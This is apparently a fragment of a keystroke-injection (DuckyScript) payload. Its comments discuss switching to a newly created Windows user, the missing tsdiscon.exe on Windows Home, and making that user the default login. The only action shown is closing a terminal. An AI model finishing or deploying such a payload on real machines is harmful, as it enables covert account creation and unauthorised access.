REM switch to new user here
REM the other user won't immediately be visible from the user selection on the left.
REM it *will* appear if the screen is allowed to go to sleep
REM to force this, run tsdiscon.exe, but this doesn't work on Windows Home (the file isn't available)

REM close the terminal
ALT F4

DELAY 1000

REM is there a way to change the last logged in user, so it's easier to automatically login as them, without having to TAB and hope for the best?
